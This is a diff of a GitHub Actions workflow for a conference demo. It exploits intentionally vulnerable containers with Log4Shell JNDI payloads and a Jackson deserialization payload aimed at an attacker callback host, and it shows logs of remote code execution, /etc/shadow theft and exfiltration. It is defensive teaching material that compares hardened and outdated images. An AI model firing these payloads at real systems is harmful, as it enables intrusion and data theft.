@@ -1,15 +1,12 @@
 name: "🔓 Vulnerable App — Full Demo"
 
-# Automated security demo: builds all 3 images, exploits them, compares results.
-# Trigger manually via GitHub Actions UI during your conference talk.
-
 on:
   workflow_dispatch:
 
 jobs:
   # ═══════════════════════════════════════════════════════════════
   demo-log4shell:
-    name: "💀 Demo 1 — Log4Shell (CVE-2021-44228)"
+    name: "💀 Demo 1 — Log4Shell RCE + Data Exfiltration"
     runs-on: ubuntu-latest
     defaults:
       run:
@@ -23,98 +20,113 @@ jobs:
           docker build -f Dockerfile.root -t vuln-app:root .
           cd "../Callback Server" && docker build -t callback-server .
 
-      - name: "🚀 Start callback server + vulnerable app"
+      - name: "🚀 Start infrastructure"
         run: |
-          # The callback server includes an LDAP server on port 1389 and HTTP on 9999
           docker run -d --name callback -p 9999:9999 -p 1389:1389 callback-server
           docker run -d --name vuln-app \
             --add-host=host.docker.internal:host-gateway \
             -p 8080:8080 vuln-app:root
-          # Wait for app readiness
           for i in $(seq 1 30); do
             curl -s http://localhost:8080/hello > /dev/null 2>&1 && break
             sleep 2
           done
-          echo "✅ App ready"
 
-      - name: "✅ Normal product search (legitimate use)"
+      - name: "📖 Demo 1 — Log4Shell"
         run: |
-          echo "## 💀 Demo 1 — Log4Shell (CVE-2021-44228)" >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
-          echo "**What is Log4Shell?** A zero-day RCE in Apache Log4j 2.x (< 2.15). Any user input" >> $GITHUB_STEP_SUMMARY
-          echo "that gets logged triggers a JNDI lookup, allowing the attacker to load and execute" >> $GITHUB_STEP_SUMMARY
-          echo "arbitrary Java classes from a remote server." >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
-          echo "### ✅ Step 1 — Normal Request (looks innocent)" >> $GITHUB_STEP_SUMMARY
-          echo '```bash' >> $GITHUB_STEP_SUMMARY
-          echo 'curl "http://localhost:8080/api/products/search?q=shirt"' >> $GITHUB_STEP_SUMMARY
-          echo '```' >> $GITHUB_STEP_SUMMARY
-          echo "Response:" >> $GITHUB_STEP_SUMMARY
-          echo '```json' >> $GITHUB_STEP_SUMMARY
-          curl -s "http://localhost:8080/api/products/search?q=shirt" | python3 -m json.tool | tee -a $GITHUB_STEP_SUMMARY
-          echo '```' >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
-          echo "> The endpoint just searches products. The developer logs the query — standard practice." >> $GITHUB_STEP_SUMMARY
+          S=$GITHUB_STEP_SUMMARY
 
-      - name: "💀 Send JNDI injection payload"
-        run: |
-          echo "" >> $GITHUB_STEP_SUMMARY
-          echo "### 💀 Step 2 — Attacker sends JNDI payload as search query" >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
-          echo "The attacker replaces the search term with a JNDI lookup expression:" >> $GITHUB_STEP_SUMMARY
-          echo '```bash' >> $GITHUB_STEP_SUMMARY
-          echo 'curl "http://victim:8080/api/products/search?q=${jndi:ldap://attacker:1389/pwned}"' >> $GITHUB_STEP_SUMMARY
-          echo '```' >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
-          echo "**What happens inside the app:**" >> $GITHUB_STEP_SUMMARY
-          echo "1. Controller calls \`log.info(\"Product search query: \" + q)\`" >> $GITHUB_STEP_SUMMARY
-          echo "2. Log4j 2.14.1 sees \`\${jndi:ldap://...}\` in the message" >> $GITHUB_STEP_SUMMARY
-          echo "3. Log4j performs an LDAP lookup to the attacker's server" >> $GITHUB_STEP_SUMMARY
-          echo "4. Attacker's LDAP server responds with a reference to a malicious Java class" >> $GITHUB_STEP_SUMMARY
-          echo "5. Victim JVM downloads and executes the class → **Remote Code Execution**" >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
+          cat >> $S << 'HEADER'
+          ## 💀 Demo 1 — Log4Shell: From Search Query to Remote Code Execution
 
-          # Fire the exploit — URL-encoded: ${jndi:ldap://host.docker.internal:1389/log4shell-pwned}
-          RESP=$(curl -s "http://localhost:8080/api/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fhost.docker.internal%3A1389%2Flog4shell-pwned%7D")
-          echo "HTTP Response (app still responds normally — victim doesn't notice!):" >> $GITHUB_STEP_SUMMARY
-          echo '```json' >> $GITHUB_STEP_SUMMARY
-          echo "$RESP" >> $GITHUB_STEP_SUMMARY
-          echo '```' >> $GITHUB_STEP_SUMMARY
-          sleep 3
+          **Scenario:** A developer builds a product search API. They log the search query —
+          standard practice. The application uses `log4j-core 2.14.1` (Dec 2021, before the patch).
 
-      - name: "📡 Check what the attacker received"
-        run: |
-          echo "" >> $GITHUB_STEP_SUMMARY
-          echo "### 📡 Step 3 — Attacker's server logs" >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
-          echo "The attacker's LDAP server received the JNDI lookup from the victim:" >> $GITHUB_STEP_SUMMARY
-          echo '```' >> $GITHUB_STEP_SUMMARY
-          docker logs callback 2>&1 | grep -E "LDAP|Victim|exploit|Serving|class" | tee -a $GITHUB_STEP_SUMMARY
-          echo '```' >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
-          echo "Victim app's internal logs (shows the JNDI lookup happening):" >> $GITHUB_STEP_SUMMARY
-          echo '```' >> $GITHUB_STEP_SUMMARY
-          docker logs vuln-app 2>&1 | grep -iE "jndi|ldap|lookup|EXPLOIT|Running as" | tail -15 | tee -a $GITHUB_STEP_SUMMARY
-          echo '```' >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
-          echo "### 🎯 Callback dashboard (proof of exploitation):" >> $GITHUB_STEP_SUMMARY
-          echo '```json' >> $GITHUB_STEP_SUMMARY
-          curl -s http://localhost:9999/dashboard | python3 -m json.tool | tee -a $GITHUB_STEP_SUMMARY
-          echo '```' >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
-          echo "> **Impact**: With a single HTTP request, the attacker achieved Remote Code Execution." >> $GITHUB_STEP_SUMMARY
-          echo "> The developer did nothing wrong — they just logged user input." >> $GITHUB_STEP_SUMMARY
-          echo "> The vulnerability is entirely in the **log4j-core 2.14.1** dependency." >> $GITHUB_STEP_SUMMARY
+          ---
+
+          ### 🏢 Victim's server — normal operation
+
+          A legitimate user searches for products:
+          ```bash
+          # On: Victim's web application (runs as root in Docker)
+          curl "http://victim:8080/api/products/search?q=shirt"
+          ```
+          HEADER
+
+          echo '```json' >> $S
+          curl -s "http://localhost:8080/api/products/search?q=shirt" | python3 -m json.tool >> $S
+          echo '```' >> $S
+          echo "" >> $S
+          echo "Everything works normally. The developer's code:" >> $S
+          echo '```java' >> $S
+          echo 'log.info("Product search query: " + q);  // just logging — what could go wrong?' >> $S
+          echo '```' >> $S
+          echo "---" >> $S
+          echo "" >> $S
+
+          # ── THE ATTACK ──
+          cat >> $S << 'ATTACK'
+          ### 💀 Attacker's machine — sending the exploit
+
+          The attacker replaces the search term with a JNDI lookup expression:
+          ```bash
+          # On: Attacker's machine
+          curl "http://victim:8080/api/products/search?q=${jndi:ldap://attacker:1389/pwned}"
+          ```
+
+          **What happens behind the scenes:**
+          1. The search query arrives at the victim's controller
+          2. The controller calls `log.info("Product search query: " + q)`
+          3. Log4j 2.14.1 sees `${jndi:ldap://...}` and performs a network lookup
+          4. The victim connects to the attacker's LDAP server (port 1389)
+          5. The LDAP server tells the victim: *"load `ExploitPayload` class from `http://attacker:9999/exploit/`"*
+          6. The victim downloads and executes the attacker's malicious Java class
+          7. **The attacker now has Remote Code Execution inside the victim's container**
+
+          ATTACK
+
+          echo "The app responds normally — **the victim doesn't notice anything:**" >> $S
+          echo '```json' >> $S
+          curl -s "http://localhost:8080/api/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fhost.docker.internal%3A1389%2Flog4shell-pwned%7D" >> $S
+          echo "" >> $S
+          echo '```' >> $S
+          sleep 5
+
+          echo "---" >> $S
+          echo "" >> $S
+
+          # ── ATTACKER'S VIEW ──
+          echo "### 📡 Attacker's server — what the attacker sees" >> $S
+          echo "" >> $S
+          echo "The attacker's LDAP + HTTP server received connections from the victim:" >> $S
+          echo '```' >> $S
+          docker logs callback 2>&1 | grep -E "LDAP lookup|Serving malicious|FILE SERVER|Victim|bytes" >> $S
+          echo '```' >> $S
+          echo "" >> $S
+
+          # ── VICTIM'S CONTAINER ──
+          echo "### 🎯 Inside the victim's container — the exploit ran" >> $S
+          echo "" >> $S
+          echo "The attacker's code executed inside the victim. Here's what it did:" >> $S
+          echo '```' >> $S
+          docker logs vuln-app 2>&1 | grep -E "REMOTE CODE|Reconnaissance|Running as|User:|Hostname:|OS:|Stealing|shadow|Exfiltrat|Demonstrat|Modified|SSH|read app|outbound|scan internal|──" >> $S
+          echo '```' >> $S
+          echo "" >> $S
+
+          cat >> $S << 'CONCLUSION'
+          ### 💡 Key takeaway
+
+          > **The developer did nothing wrong.** They just logged user input — standard practice.
+          > The vulnerability is entirely in the **log4j-core 2.14.1 dependency**.
+          > Updating to log4j 2.17+ or removing log4j-core completely prevents this attack.
+          CONCLUSION
 
       - name: "🧹 Cleanup"
         if: always()
-        run: |
-          docker stop vuln-app callback 2>/dev/null || true
-          docker rm vuln-app callback 2>/dev/null || true
+        run: docker stop vuln-app callback 2>/dev/null || true; docker rm vuln-app callback 2>/dev/null || true
 
   # ═══════════════════════════════════════════════════════════════
   demo-jackson:
-    name: "💀 Demo 2 — Jackson Deserialization (CVE-2019-14379)"
+    name: "💀 Demo 2 — Jackson Deserialization"
     runs-on: ubuntu-latest
     defaults:
       run:
@@ -131,56 +143,85 @@ jobs:
           docker run -d --name vuln-app --add-host=host.docker.internal:host-gateway -p 8080:8080 vuln-app:root
           for i in $(seq 1 30); do curl -s http://localhost:8080/hello > /dev/null 2>&1 && break; sleep 2; done
 
-      - name: "✅ Normal JSON import"
+      - name: "📖 Demo 2 — Jackson"
         run: |
-          echo "## 💀 Demo 2 — Jackson Deserialization RCE (CVE-2019-14379)" >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
-          echo "**What is this?** Jackson's \`enableDefaultTyping()\` allows JSON payloads to specify" >> $GITHUB_STEP_SUMMARY
-          echo "which Java class to instantiate. An attacker can craft JSON that creates dangerous objects" >> $GITHUB_STEP_SUMMARY
-          echo "(URL connections, file writers, runtime exec) on the server." >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
-          echo "### ✅ Step 1 — Normal Request" >> $GITHUB_STEP_SUMMARY
-          echo '```bash' >> $GITHUB_STEP_SUMMARY
-          echo 'curl -X POST http://localhost:8080/api/users/import -d '\''{"name":"Alice"}'\''' >> $GITHUB_STEP_SUMMARY
-          echo '```' >> $GITHUB_STEP_SUMMARY
-          echo '```json' >> $GITHUB_STEP_SUMMARY
+          S=$GITHUB_STEP_SUMMARY
+
+          cat >> $S << 'HEADER'
+          ## 💀 Demo 2 — Jackson Deserialization: Attacker Controls Your Objects
+
+          **Scenario:** A developer builds a "user import" API that accepts JSON.
+          The `ObjectMapper` uses `enableDefaultTyping()` — a legacy configuration found in
+          many real applications. The application uses `jackson-databind 2.13.4.1`.
+
+          ---
+
+          ### 🏢 Victim's server — normal use
+
+          A legitimate user imports their profile:
+          ```bash
+          # On: Victim's web application
+          curl -X POST http://victim:8080/api/users/import \
+            -H "Content-Type: application/json" \
+            -d '{"name":"Alice","email":"alice@conf.io"}'
+          ```
+          HEADER
+
+          echo '```json' >> $S
           curl -s -X POST http://localhost:8080/api/users/import \
             -H "Content-Type: application/json" \
-            -d '{"name":"Alice","email":"alice@conf.io"}' | python3 -m json.tool | tee -a $GITHUB_STEP_SUMMARY
-          echo '```' >> $GITHUB_STEP_SUMMARY
+            -d '{"name":"Alice","email":"alice@conf.io"}' | python3 -m json.tool >> $S
+          echo '```' >> $S
+          echo "" >> $S
+          echo "---" >> $S
+          echo "" >> $S
 
-      - name: "💀 Polymorphic deserialization attack"
-        run: |
-          echo "" >> $GITHUB_STEP_SUMMARY
-          echo "### 💀 Step 2 — Attacker sends polymorphic payload" >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
-          echo "The attacker sends JSON that tells Jackson to instantiate \`java.net.URL\`:" >> $GITHUB_STEP_SUMMARY
-          echo '```json' >> $GITHUB_STEP_SUMMARY
-          echo '["java.net.URL", "http://attacker:9999/jackson-rce-proof"]' >> $GITHUB_STEP_SUMMARY
-          echo '```' >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
+          cat >> $S << 'ATTACK'
+          ### 💀 Attacker's machine — polymorphic payload
 
+          The attacker sends JSON that tells Jackson **which Java class to instantiate**:
+          ```bash
+          # On: Attacker's machine
+          curl -X POST http://victim:8080/api/users/import \
+            -H "Content-Type: application/json" \
+            -d '["java.net.URL", "http://attacker:9999/jackson-rce-proof"]'
+          ```
+
+          Instead of a user profile, the attacker passes `["java.net.URL", "http://..."]`.
+          Jackson's `enableDefaultTyping()` interprets the first element as a Java class name
+          and instantiates it with the second element as constructor argument.
+          ATTACK
+
+          echo "" >> $S
+          echo "Response from the server:" >> $S
+          echo '```json' >> $S
           RESP=$(curl -s -X POST http://localhost:8080/api/users/import \
             -H "Content-Type: application/json" \
             -d '["java.net.URL", "http://host.docker.internal:9999/jackson-rce-proof"]')
-          echo "Response:" >> $GITHUB_STEP_SUMMARY
-          echo '```json' >> $GITHUB_STEP_SUMMARY
-          echo "$RESP" | python3 -m json.tool 2>/dev/null || echo "$RESP" | tee -a $GITHUB_STEP_SUMMARY
-          echo '```' >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
-          echo "**\`parsed_type: URL\` proves the attacker controlled which Java class was instantiated!**" >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
-          echo "In a real attack, the attacker uses gadget classes (e.g., \`TemplatesImpl\`, \`JdbcRowSetImpl\`)" >> $GITHUB_STEP_SUMMARY
-          echo "that trigger code execution during deserialization. The fix: **never use \`enableDefaultTyping()\`**" >> $GITHUB_STEP_SUMMARY
-          echo "and keep jackson-databind updated." >> $GITHUB_STEP_SUMMARY
+          echo "$RESP" | python3 -m json.tool 2>/dev/null >> $S || echo "$RESP" >> $S
+          echo '```' >> $S
+          echo "" >> $S
+
+          cat >> $S << 'CONCLUSION'
+          ### 💡 Key takeaway
+
+          > **`parsed_type: URL` proves the attacker controlled which Java class was instantiated.**
+          >
+          > In this demo we used `java.net.URL` (harmless). In a real attack, the attacker uses
+          > gadget classes like `JdbcRowSetImpl` (triggers JNDI → RCE) or `TemplatesImpl`
+          > (executes arbitrary bytecode) — same result as Log4Shell.
+          >
+          > **Fix:** Never use `enableDefaultTyping()`. Use `@JsonTypeInfo` with allow-lists instead.
+          > Update jackson-databind to the latest version.
+          CONCLUSION
 
       - name: "🧹 Cleanup"
         if: always()
         run: docker stop vuln-app callback 2>/dev/null; docker rm vuln-app callback 2>/dev/null
 
   # ═══════════════════════════════════════════════════════════════
-  demo-pwnkit:
-    name: "💀 Demo 3 — Full Chain: Log4Shell → RCE → PwnKit → Root"
+  demo-full-chain:
+    name: "💀 Demo 3 — Log4Shell → RCE → Root Access"
     runs-on: ubuntu-latest
     defaults:
       run:
@@ -191,80 +232,120 @@ jobs:
 
       - name: "🏗️ Build all images"
         run: |
+          docker build -f Dockerfile.root -t vuln-app:root .
           docker build -f Dockerfile.escalation -t vuln-app:escalation .
           docker build -f Dockerfile.nonroot -t vuln-app:safe .
           cd "../Callback Server" && docker build -t callback-server .
 
-      - name: "🚀 Start attacker infrastructure + victim"
+      - name: "🚀 Start attacker + victim (root image)"
         run: |
-          # Attacker's server: LDAP (1389) + HTTP for exploit classes & payloads (9999)
           docker run -d --name callback -p 9999:9999 -p 1389:1389 callback-server
-          # Victim: runs as non-root (appuser) but has vulnerable pkexec + gcc
           docker run -d --name vuln-app \
             --add-host=host.docker.internal:host-gateway \
-            -p 8080:8080 vuln-app:escalation
-          for i in $(seq 1 30); do curl -s http://localhost:8080/hello > /dev/null 2>&1 && break; sleep 2; done
-          echo "✅ Victim (non-root + vulnerable packages) and attacker ready"
-
-      - name: "💀 THE ATTACK — Single HTTP request → root"
-        run: |
-          echo "## 💀 Demo 3 — Full Exploit Chain" >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
-          echo "**A SINGLE HTTP GET request chains two CVEs to gain root access:**" >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
-          echo "| Step | What happens | CVE |" >> $GITHUB_STEP_SUMMARY
-          echo "|------|-------------|-----|" >> $GITHUB_STEP_SUMMARY
-          echo "| 1 | Attacker sends search query with JNDI payload | — |" >> $GITHUB_STEP_SUMMARY
-          echo "| 2 | Log4j performs JNDI/LDAP lookup to attacker | CVE-2021-44228 |" >> $GITHUB_STEP_SUMMARY
-          echo "| 3 | LDAP server returns reference to malicious class | — |" >> $GITHUB_STEP_SUMMARY
-          echo "| 4 | Victim downloads & executes attacker's Java class | — |" >> $GITHUB_STEP_SUMMARY
-          echo "| 5 | Malicious class downloads PwnKit exploit source | — |" >> $GITHUB_STEP_SUMMARY
-          echo "| 6 | Compiles with gcc, exploits pkexec SUID → **ROOT** | CVE-2021-4034 |" >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
-          echo "### The attack command:" >> $GITHUB_STEP_SUMMARY
-          echo '```bash' >> $GITHUB_STEP_SUMMARY
-          echo 'curl "http://victim:8080/api/products/search?q=${jndi:ldap://attacker:1389/pwnkit}"' >> $GITHUB_STEP_SUMMARY
-          echo '```' >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
-
-          # Fire the actual exploit
-          curl -s "http://localhost:8080/api/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fhost.docker.internal%3A1389%2Fpwnkit%7D" || true
-          sleep 8
-
-          echo "### 📡 Attacker's LDAP server (received JNDI lookup from victim):" >> $GITHUB_STEP_SUMMARY
-          echo '```' >> $GITHUB_STEP_SUMMARY
-          docker logs callback 2>&1 | grep -E "LDAP|Victim|exploit|Serving|class|download" | tee -a $GITHUB_STEP_SUMMARY
-          echo '```' >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
-
-          echo "### 🎯 Victim container logs (RCE + privilege escalation):" >> $GITHUB_STEP_SUMMARY
-          echo '```' >> $GITHUB_STEP_SUMMARY
-          docker logs vuln-app 2>&1 | grep -iE "EXPLOIT|uid=|root|pwnkit|Running as|Escalat|FOUND|Step" | tee -a $GITHUB_STEP_SUMMARY
-          echo '```' >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
-          echo "> **Result**: Started as \`appuser\` (non-root), ended as \`uid=0(root)\`." >> $GITHUB_STEP_SUMMARY
-          echo "> Running as non-root is NOT enough if vulnerable OS packages (pkexec, gcc) are present." >> $GITHUB_STEP_SUMMARY
-
-      - name: "🔒 Same attack on SAFE image — blocked"
-        run: |
-          docker stop vuln-app; docker rm vuln-app
-          docker run -d --name vuln-app --add-host=host.docker.internal:host-gateway -p 8080:8080 vuln-app:safe
+            -p 8080:8080 vuln-app:root
           for i in $(seq 1 30); do curl -s http://localhost:8080/hello > /dev/null 2>&1 && break; sleep 2; done
 
-          echo "### 🔒 Same attack on the SAFE image" >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
-          echo "The safe image uses \`eclipse-temurin:25-jre\` (modern, minimal, no extra packages)." >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
-          curl -s "http://localhost:8080/api/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fhost.docker.internal%3A1389%2Fpwnkit%7D" || true
-          sleep 3
+      - name: "📖 Demo 3 — Full chain on ROOT image"
+        run: |
+          S=$GITHUB_STEP_SUMMARY
 
-          echo '```' >> $GITHUB_STEP_SUMMARY
-          docker logs vuln-app 2>&1 | tail -10 | tee -a $GITHUB_STEP_SUMMARY
-          echo '```' >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
-          echo "✅ **JNDI lookup is blocked** — Java 25 defaults \`trustURLCodebase=false\`, preventing remote class loading." >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
-          echo "Even if it weren't blocked: no gcc, no pkexec, no curl → attacker can't do anything useful." >> $GITHUB_STEP_SUMMARY
+          cat >> $S << 'HEADER'
+          ## 💀 Demo 3 — One HTTP Request → Full Server Compromise
+
+          **Scenario:** Same Log4Shell attack, but now we look at what the attacker
+          does AFTER getting code execution. Two images compared:
+          - 🔴 **Root image** — runs as root, old OS, has gcc/curl/wget
+          - 🟢 **Safe image** — runs as non-root, modern OS, no extra tools
+
+          ---
+
+          ### 🔴 Attack on ROOT image
+
+          The attacker sends the same exploit as Demo 1:
+          ```bash
+          # On: Attacker's machine
+          curl "http://victim:8080/api/products/search?q=${jndi:ldap://attacker:1389/pwned}"
+          ```
+          HEADER
+
+          # Fire exploit
+          curl -s "http://localhost:8080/api/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fhost.docker.internal%3A1389%2Flog4shell-pwned%7D" > /dev/null || true
+          sleep 6
+
+          echo "" >> $S
+          echo "#### 🎯 What the attacker's code did inside the ROOT container:" >> $S
+          echo '```' >> $S
+          docker logs vuln-app 2>&1 | grep -E "REMOTE CODE|Reconnaissance|User:|Hostname:|OS:|Stealing|shadow|root:|Exfiltrat|HTTP|Demonstrat|Modified|SSH|create users|pivot|──|\[" | head -30 >> $S
+          echo '```' >> $S
+          echo "" >> $S
+
+          echo "#### 📡 Attacker's server received the stolen data:" >> $S
+          echo '```' >> $S
+          docker logs callback 2>&1 | grep -A5 "stolen-data" | head -10 >> $S
+          echo '```' >> $S
+          echo "" >> $S
+
+          cat >> $S << 'ROOT_IMPACT'
+          > **Impact on ROOT image:** The attacker read `/etc/shadow` (password hashes),
+          > modified system files, and exfiltrated data. Full server compromise from a single HTTP request.
+
+          ---
+
+          ROOT_IMPACT
+
+      - name: "🔒 Same attack on SAFE image"
+        run: |
+          S=$GITHUB_STEP_SUMMARY
+
+          docker stop vuln-app 2>/dev/null; docker rm vuln-app 2>/dev/null
+          # Clear callback dashboard
+          curl -s -X DELETE http://localhost:9999/dashboard > /dev/null || true
+
+          docker run -d --name vuln-app \
+            --add-host=host.docker.internal:host-gateway \
+            -p 8080:8080 vuln-app:safe
+          for i in $(seq 1 30); do curl -s http://localhost:8080/hello > /dev/null 2>&1 && break; sleep 2; done
+
+          echo "### 🟢 Same attack on SAFE image" >> $S
+          echo "" >> $S
+          echo "Same exploit, same application JAR, but different container configuration:" >> $S
+          echo '```bash' >> $S
+          echo '# On: Attacker'\''s machine — exact same command' >> $S
+          echo 'curl "http://victim:8080/api/products/search?q=${jndi:ldap://attacker:1389/pwned}"' >> $S
+          echo '```' >> $S
+          echo "" >> $S
+
+          curl -s "http://localhost:8080/api/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fhost.docker.internal%3A1389%2Flog4shell-pwned%7D" > /dev/null || true
+          sleep 4
+
+          echo "#### Result on SAFE image:" >> $S
+          echo '```' >> $S
+          docker logs vuln-app 2>&1 | tail -8 >> $S
+          echo '```' >> $S
+          echo "" >> $S
+
+          cat >> $S << 'SAFE_RESULT'
+          > **The JNDI lookup is blocked.** Java 25 defaults `com.sun.jndi.ldap.object.trustURLCodebase=false`,
+          > preventing the JVM from loading remote classes. The attack fails silently.
+          >
+          > Even if it weren't blocked: no `curl` (can't download exploits), no `gcc` (can't compile),
+          > no `pkexec` (can't escalate), non-root user (can't read `/etc/shadow`).
+
+          ---
+
+          ### 💡 Comparison
+
+          | | 🔴 Root image | 🟢 Safe image |
+          |---|---|---|
+          | **JNDI class loading** | ✅ Succeeds (trustURLCodebase=true) | ❌ Blocked (default) |
+          | **Read /etc/shadow** | ✅ Root can read everything | ❌ Permission denied |
+          | **Exfiltrate data** | ✅ curl available | ❌ No curl/wget |
+          | **Compile exploits** | ✅ gcc installed | ❌ No compiler |
+          | **Base image CVEs** | Hundreds (Ubuntu 22.04) | Near zero (modern) |
+
+          > **The same vulnerable JAR runs in both containers.** The difference is entirely
+          > in the container configuration. Keep your base images updated and minimal.
+          SAFE_RESULT
 
       - name: "🧹 Cleanup"
         if: always()
@@ -292,11 +373,15 @@ jobs:
 
       - name: "📊 Scan & compare"
         run: |
-          echo "## 📊 Image Security Comparison" >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
-          echo "Three Docker images running the **exact same application** (same JAR), but with" >> $GITHUB_STEP_SUMMARY
-          echo "different base images and configurations:" >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
+          S=$GITHUB_STEP_SUMMARY
+
+          cat >> $S << 'HEADER'
+          ## 📊 Image Security Comparison
+
+          Three Docker images running the **exact same application JAR**, but with
+          different base images and configurations:
+
+          HEADER
 
           declare -A TOTALS CRITS HIGHS SIZES
 
@@ -308,36 +393,25 @@ jobs:
             SIZES[$IMG]=$(docker image inspect "vuln-app:$IMG" --format='{{.Size}}' | awk '{printf "%.0f", $1/1024/1024}')
           done
 
-          echo "| Metric | 🔴 root | ⚠️ escalation | 🟢 safe |" >> $GITHUB_STEP_SUMMARY
-          echo "|--------|---------|---------------|---------|" >> $GITHUB_STEP_SUMMARY
-          echo "| Total CVEs | ${TOTALS[root]} | ${TOTALS[escalation]} | ${TOTALS[safe]} |" >> $GITHUB_STEP_SUMMARY
-          echo "| CRITICAL | ${CRITS[root]} | ${CRITS[escalation]} | ${CRITS[safe]} |" >> $GITHUB_STEP_SUMMARY
-          echo "| HIGH | ${HIGHS[root]} | ${HIGHS[escalation]} | ${HIGHS[safe]} |" >> $GITHUB_STEP_SUMMARY
-          echo "| Image Size | ${SIZES[root]} MB | ${SIZES[escalation]} MB | ${SIZES[safe]} MB |" >> $GITHUB_STEP_SUMMARY
-          echo "| User | root | appuser | ubuntu |" >> $GITHUB_STEP_SUMMARY
-          echo "| Has pkexec (PwnKit) | ✅ | ✅ | ❌ |" >> $GITHUB_STEP_SUMMARY
-          echo "| Has gcc | ✅ | ✅ | ❌ |" >> $GITHUB_STEP_SUMMARY
-          echo "| Has curl/wget/nc | ✅ | ✅ | ❌ |" >> $GITHUB_STEP_SUMMARY
-          echo "| Base image | temurin:11-jre-jammy | temurin:11-jre-jammy | temurin:25-jre |" >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
+          cat >> $S << TABLE
+          | Metric | 🔴 root | ⚠️ escalation | 🟢 safe |
+          |--------|---------|---------------|---------|
+          | Total CVEs | ${TOTALS[root]} | ${TOTALS[escalation]} | ${TOTALS[safe]} |
+          | CRITICAL | ${CRITS[root]} | ${CRITS[escalation]} | ${CRITS[safe]} |
+          | HIGH | ${HIGHS[root]} | ${HIGHS[escalation]} | ${HIGHS[safe]} |
+          | Image Size | ${SIZES[root]} MB | ${SIZES[escalation]} MB | ${SIZES[safe]} MB |
+          | User | root | appuser | ubuntu |
+          | Has curl/gcc/pkexec | ✅ | ✅ | ❌ |
+          | Base image | temurin:11-jre-jammy | temurin:11-jre-jammy | temurin:25-jre |
 
-          # Plain text table to stdout
-          echo ""
-          printf "%-18s %-12s %-14s %-12s\n" "Metric" "root" "escalation" "safe"
-          printf "%-18s %-12s %-14s %-12s\n" "──────────────────" "────────────" "──────────────" "────────────"
-          printf "%-18s %-12s %-14s %-12s\n" "Total CVEs" "${TOTALS[root]}" "${TOTALS[escalation]}" "${TOTALS[safe]}"
-          printf "%-18s %-12s %-14s %-12s\n" "CRITICAL" "${CRITS[root]}" "${CRITS[escalation]}" "${CRITS[safe]}"
-          printf "%-18s %-12s %-14s %-12s\n" "HIGH" "${HIGHS[root]}" "${HIGHS[escalation]}" "${HIGHS[safe]}"
-          printf "%-18s %-12s %-14s %-12s\n" "Image Size (MB)" "${SIZES[root]}" "${SIZES[escalation]}" "${SIZES[safe]}"
-          echo ""
+          TABLE
 
-          echo "### 🔴 Top vulnerabilities — vuln-app:root" >> $GITHUB_STEP_SUMMARY
-          echo '```' >> $GITHUB_STEP_SUMMARY
-          trivy image --severity CRITICAL,HIGH --no-progress vuln-app:root 2>/dev/null | head -50 >> $GITHUB_STEP_SUMMARY
-          echo '```' >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
-          echo "### 🟢 Scan — vuln-app:safe" >> $GITHUB_STEP_SUMMARY
-          echo '```' >> $GITHUB_STEP_SUMMARY
-          trivy image --severity CRITICAL,HIGH --no-progress vuln-app:safe 2>/dev/null | head -50 >> $GITHUB_STEP_SUMMARY
-          echo '```' >> $GITHUB_STEP_SUMMARY
-
+          echo "### 🔴 Top vulnerabilities — vuln-app:root" >> $S
+          echo '```' >> $S
+          trivy image --severity CRITICAL,HIGH --no-progress vuln-app:root 2>/dev/null | head -50 >> $S
+          echo '```' >> $S
+          echo "" >> $S
+          echo "### 🟢 Scan — vuln-app:safe" >> $S
+          echo '```' >> $S
+          trivy image --severity CRITICAL,HIGH --no-progress vuln-app:safe 2>/dev/null | head -50 >> $S
+          echo '```' >> $S
